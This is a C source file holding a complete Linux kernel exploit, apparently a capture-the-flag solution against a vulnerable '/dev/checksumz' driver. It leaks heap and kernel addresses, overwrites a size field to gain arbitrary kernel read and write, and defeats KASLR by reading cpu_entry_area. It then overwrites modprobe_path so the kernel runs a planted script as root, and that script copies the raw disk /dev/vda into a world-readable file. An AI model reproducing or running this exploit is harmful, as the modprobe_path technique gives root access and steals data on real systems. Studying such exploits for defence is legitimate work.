#include "api.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

uint64_t relative_addr = 0;

void hexdump(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0 && i != 0) {
            puts("");
        }
        printf("%02x ", buffer[i]);
    }
};

uint64_t try_break_kaslr(int fd) {
    if (fd == INVALID_FD) { 
        return -1;
    }

    uint8_t* buffer = (uint8_t*) calloc(BUF_SIZE, sizeof(uint8_t));
    read(fd, buffer, BUF_SIZE); // skip
    read(fd, buffer, BUF_SIZE - 1); // skip

    memset(buffer, 0x0, BUF_SIZE);
    read(fd, buffer, 256); // leak

    // get buffer->name pointer
    uint64_t leak_name = *(uint64_t*)(buffer + 17);
    printf("{+} heap leak name: 0x%llx\n", leak_name);

    // change size to 0xffffffffffffffff
    lseek(fd, (off_t)511, SEEK_SET);
    uint8_t write_buffer[16] = {0, 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 0, 0, 0, 0, 0, 0, 0};
    write(fd, write_buffer, 16);
    
    uint64_t content_addr = 0x0;

    for (int i = 0; i < 0x10000; i += 8) {
        char tmp_buf[8] = {0};
     
        lseek(fd, (off_t)512 + i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(+): 0x%llx\n", 512 + i);
            content_addr = leak_name - 512 - i;
            break;
        }

        lseek(fd, (off_t)0 - i, SEEK_SET);
        read(fd, tmp_buf, 8);
        if (!strncmp(tmp_buf, "default", 7)) {
            printf("off(-): 0x%llx\n", i);
            content_addr = leak_name + i;
            break;
        }
    }

    printf("{+} buffer->content: 0x%8lx\n", content_addr);
    uint64_t cpu_entry_area = 0xfffffe0000000004;
    // read cpu_entry_area
    lseek(fd, (off_t)(cpu_entry_area - content_addr), SEEK_SET);
    uint64_t kaslr_leak = 0;
    read(fd, &kaslr_leak, 8);

    printf("{+} KASLR leak: 0x%08llx\n", kaslr_leak);
    uint64_t kaslr_base = kaslr_leak - 0x1008e00;
    printf("{+} KASLR base: 0x%08llx\n", kaslr_base);
    relative_addr = content_addr;

    return kaslr_base;
};

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    int fd = open("/dev/checksumz", O_RDWR);
    uint64_t KASLR = try_break_kaslr(fd);
    if (KASLR == -1 || ((KASLR & 0xfffff) != 0)) {
        puts("kaslr invalid!");
        return 0;
    }
    uint64_t modeprobe = KASLR + 0x1b3f100;

    int trig_fd = open("/tmp/kek", O_RDWR | O_CREAT);
    write(trig_fd, "#!/bin/sh\ncat /dev/vda>/f\nchmod 777 f\n", 39);
    close(trig_fd);
    system("chmod 777 /tmp/kek");

    printf("{+} modeprobe_path: 0x%08llx\n", modeprobe);
    lseek(fd, (off_t)(modeprobe - relative_addr), SEEK_SET);
    write(fd, "/tmp/kek", 12);
    
    trig_fd = open("pek", O_RDWR | O_CREAT);
    write(trig_fd, "\xde\xad\xbe\xef", 4);
    close(trig_fd);

    system("chmod 777 ./pek; ./pek;");
}
